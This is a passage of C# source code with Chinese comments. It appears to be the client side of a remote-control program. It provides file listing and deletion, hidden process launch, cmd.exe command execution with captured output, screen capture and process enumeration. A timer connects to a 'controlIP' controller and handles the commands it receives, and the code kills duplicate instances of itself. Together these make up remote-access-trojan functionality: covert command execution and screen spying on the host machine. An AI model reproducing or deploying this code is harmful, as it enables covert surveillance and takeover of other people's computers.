                    str += d.FullName + "      CTime:" + d.CreationTime + "      ATime:" + d.LastAccessTime + "      WTime:" + d.LastWriteTime + "\r\n    ";
                }
                FileInfo[] files = dire.GetFiles();
                str += "\r\n文件部分\r\n    ";
                string s;
                int l;
                foreach (FileInfo f in files)
                {
                    s = (f.Length / 1024).ToString();
                    l = s.Length;
                    if (l > 3)
                    {
                        str += f.FullName + "      Size:" + s.Substring(0, l - 3) + "," + s.Substring(l - 3, 3) + "K      CTime:" + f.CreationTime + "      ATime:" + f.LastAccessTime + "      WTime:" + f.LastWriteTime + "\r\n    ";
                    }
                    else
                    {
                        str += f.FullName + "      Size:" + s + "K      CTime:" + f.CreationTime + "      ATime:" + f.LastAccessTime + "      WTime:" + f.LastWriteTime + "\r\n    ";
                    }
                }
            }
            catch
            {
                str = "加载文件出错！";
            }
            return "加载时间：" + DateTime.Now.ToString() + "\r\n" + str;
        }

        /// <summary>
        /// 查找文件
        /// </summary>
        /// <param name="folderName">查找目录</param>
        /// <param name="findStr">查找内容</param>
        /// <returns></returns>
        public static string findFile(string folderName, string findStr, string inFind)
        {
            bool b = false;
            if (inFind == "True")
                b = true;
            string str = FindFile(folderName, findStr, b,"");
            return "加载时间：" + DateTime.Now.ToString() + "\r\n" + str;
        }

        /// <summary>
        /// 操作文件
        /// </summary>
        /// <param name="arg">操作命令</param>
        /// <param name="sourseUrl">源路径</param>
        /// <param name="destinationUrl">目的路径</param>
        /// <returns></returns>
        public static string operFile(string arg,string sourseUrl,string destinationUrl)
        {
            if (!File.Exists(sourseUrl))
                return "源文件不存在！  时间为：" + DateTime.Now.ToString();

            FileInfo f = new FileInfo(sourseUrl);
            string str = "目的文件不存在！\r\n";
            if (File.Exists(destinationUrl))
            {
                str = "目的文件原已存在！\r\n";
            }

            try
            {
                switch (arg)
                {
                    case "copy": f.CopyTo(destinationUrl, false); break;
                    case "copyover": f.CopyTo(destinationUrl, true); break;
                    case "del": f.Delete(); break;
                    case "move": f.MoveTo(destinationUrl); break;
                    default: break;
                }
                str += "  " + arg + " 文件从 " + sourseUrl + " 到 " + destinationUrl + " 成功。\r\n   时间为：" + DateTime.Now.ToString();
            }
            catch
            {
                str += "  操作文件失败！\r\n   时间为：" + DateTime.Now.ToString();
            }
            return str;
        }

        /// <summary>
        /// 显示简单对话框
        /// </summary>
        /// <param name="str">显示内容</param>
        /// <returns></returns>
        public static string showMsg(string str)
        {
            MessageBox.Show(str);
            return "发送消息成功！ 时间为：" + DateTime.Now.ToString();
        }

        /// <summary>
        /// 显示对话框
        /// </summary>
        /// <param name="text">显示内容</param>
        /// <param name="cap">显示标题</param>
        /// <param name="msgBtn">显示的格式</param>
        /// <returns></returns>
        public static string showMsgs(string text, string cap, string msgBtn)
        {
            //     消息框包含“确定”按钮。   OK = 0,
            //     消息框包含“确定”和“取消”按钮。    OKCancel = 1,
            //     消息框包含“中止”、“重试”和“忽略”按钮。   AbortRetryIgnore = 2,
            //     消息框包含“是”、“否”和“取消”按钮。        YesNoCancel = 3,
            //     消息框包含“是”和“否”按钮。        YesNo = 4,
            //     消息框包含“重试”和“取消”按钮。        RetryCancel = 5,
            int en = 0;
            try
            {
                en = int.Parse(msgBtn);
                MessageBox.Show(text, cap, (MessageBoxButtons)en);
            }
            catch
            { return "发送消息错误！ 时间为：" + DateTime.Now.ToString(); }
            return "发送消息成功！ 时间为：" + DateTime.Now.ToString();
        }

        /// <summary>
        /// 开始一个新进程
        /// </summary>
        /// <param name="fileName">进程名或路径</param>
        /// <param name="arguments">参数</param>
        /// <returns></returns>
        public static string startPro(string fileName)
        {
            try
            {
                Process p = new Process();
                ProcessStartInfo pStartInfo = new ProcessStartInfo();
                pStartInfo.FileName = fileName;
                pStartInfo.CreateNoWindow = true;//不显示程序窗口
                p.StartInfo = pStartInfo;
                p.Start();
                return "进程启动成功！ 时间为：" + DateTime.Now.ToString();
            }
            catch (Exception e1)
            {
                return e1.ToString() + "时间为：" + DateTime.Now.ToString();
            }
        }

        /// <summary>
        /// 开始一个新进程
        /// </summary>
        /// <param name="fileName">进程名或路径</param>
        /// <param name="arguments">参数</param>
        /// <returns></returns>
        public static string cmd(string fileName, string arguments)
        {
            try
            {
                Process p = new Process();
                ProcessStartInfo pStartInfo = new ProcessStartInfo();
                //pStartInfo.FileName = "cmd";//要执行的程序名称
                pStartInfo.UseShellExecute = false;
                pStartInfo.RedirectStandardOutput = true;//由调用程序获取输出信息
                pStartInfo.CreateNoWindow = true;//不显示程序窗口
                pStartInfo.FileName = fileName;
                pStartInfo.Arguments = arguments;

                p.StartInfo = pStartInfo;
                string sOutput = "";
                try
                {
                    p.Start();
                    //获取CMD窗口的输出信息：
                    sOutput = p.StandardOutput.ReadToEnd();
                }
                catch
                { }
                p.Close();
                return sOutput + "\r\n 时间为：" + DateTime.Now.ToString();
            }
            catch (Exception e1)
            {
                return e1.Message + "时间为：" + DateTime.Now.ToString();
            }
        }

        /// <summary>
        /// cmd本身命令操作
        /// </summary>
        /// <param name="arguments">命令</param>
        /// <returns></returns>
        public static string cmdSelf(string arguments)
        {
            try
            {
                Process p = new Process();
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardInput = true;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.StartInfo.CreateNoWindow = true;
                p.Start();
                string sOutput = "执行命令 " + arguments + " 成功！";
                try
                {
                    p.StandardInput.WriteLine(arguments);//CMD命令
                    Thread.Sleep(300);
                    p.StandardInput.WriteLine("exit");
                }
                catch (Exception ex)
                {
                    sOutput = ex.Message;
                }
                p.Close();
                return sOutput + "\r\n 时间为：" + DateTime.Now.ToString();
            }
            catch (Exception e1)
            {
                return e1.Message + "时间为：" + DateTime.Now.ToString();
            }
        }

        /// <summary>
        /// 获取指定大小质量的图片字节流
        /// </summary>
        /// <param name="imgX">图片宽</param>
        /// <param name="imgY">图片高</param>
        /// <param name="imgRank">图片质量等级</param>
        /// <returns></returns>
        public static byte[] getPic(string imgX, string imgY, string imgRank)
        {
            Graphics g = Graphics.FromImage(img);
            g.CopyFromScreen(new Point(0, 0), new Point(0, 0), new Size(maxScreen), CopyPixelOperation.SourceCopy);
            //Clipboard.SetImage(img);
            MemoryStream ms = new MemoryStream();

            Image tImg;
            try
            {
                tImg = GetThumbNailImage(img, int.Parse(imgX), int.Parse(imgY));
                tImg.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
            }
            catch
            {
                img.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
            }
            return ms.ToArray();
        }

        /// <summary>
        /// 获取所有进程信息
        /// </summary>
        /// <param name="n">一行显示个数</param>
        /// <returns></returns>
        public static string getAllPro(string n)
        {
            string str = "";
            Process[] pros = Process.GetProcesses();
            int i = 0;
            foreach (Process p in pros)
            {
                str += p.ProcessName + " " + p.Id.ToString() + "     ";
                i++;
                try
                {
                    if (i == int.Parse(n))
                    {
                        str += "\r\n";
                        i = 0;
                    }
                }
                catch
                {
                    return "参数应是整数！ 时间：" + DateTime.Now.ToString();
                }
            }
            return str;
        }

        /// <summary>
        /// 供外部调用同一命名，目的是关闭本身
        /// </summary>
        /// <param name="PCMUrl">命名规则需要重新启动的新进程地址</param>
        public void reNewSelf(string PCMUrl)
        {
            ctrlClose = true;
            this.Close();
            this.Dispose();
        }

        /// <summary>
        /// 获取默认大小质量的图片
        /// </summary>
        /// <returns>图片字节流</returns>
        public static byte[] getPicNon()
        {
            Graphics g = Graphics.FromImage(img);
            g.CopyFromScreen(new Point(0, 0), new Point(0, 0), new Size(maxScreen), CopyPixelOperation.SourceCopy);
            //Clipboard.SetImage(img);
            MemoryStream ms = new MemoryStream();
            img.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);

            return ms.ToArray();
        }

        /// <summary>
        /// 时刻监控接收到的信息
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void netTimer_Tick(object sender, ElapsedEventArgs e)
        {
            string resStr = "";
            if (SendRec.recOk)
            {
                resStr = SendRec.recStr;
                SendRec.recOk = false;
                dealRec(resStr);
            }
        }

        /// <summary>
        /// 连接控制端
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void connectTimer_Tick(object sender, ElapsedEventArgs e)
        {
            SendRec.sendStr("", controlIP);

            pros = Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName);
            int thisId = Process.GetCurrentProcess().Id;
            int otherId;
            if (pros.Length > 1)
            {
                if (!SendRec.listenOk)
                {
                    Process.GetProcessById(thisId).Kill();
                    return;
                }
                else
                {
                    if (pros[0].Id == thisId)
                        otherId = pros[1].Id;
                    else
                        otherId = pros[0].Id;

                    Process.GetProcessById(otherId).Kill();
                }
            }
        }

        #endregion

    }

    class ProInfo
    {
        Process pro;//进程

        public string proID;//进程ID

        public string fileName;//进程路径

        public string winName;//进程窗口名

        public string startTime;//进程启动时间

        public ProInfo(Process p)
        {
            pro = p;
            try
            {
                proID = p.Id.ToString();//进程ID
            }
            catch
            {
                proID = "拒绝访问或访问出错";
            }
            try
            {
                fileName = p.MainModule.FileName;
            }
            catch
            {
                try
                {
                    fileName = p.ProcessName;//进程名

                }
                catch
                {
                    fileName = "拒绝访问或访问出错";
                }
            }
            try
            {
                winName = p.MainWindowTitle;//进程窗体名
            }
            catch
            {
                winName = "拒绝访问或访问出错";
            }
            try
            {
                startTime = p.StartTime.ToString();//进程窗体名
            }
            catch
            {
                startTime = "拒绝访问或访问出错";
            }
        }

        /// <summary>
        /// 获取进程数据信息
        /// </summary>
        /// <returns></returns>
        public string[] getArray()
        {
            return new string[] { proID, fileName, winName, startTime };
        }

        /// <summary>
        /// 获取进程字符串信息
        /// </summary>
        /// <param name="divide"></param>
        /// <returns></returns>
        public string getStr(string divide)
        {
            return proID + divide + fileName + divide + winName + divide + startTime;
        }
    }
}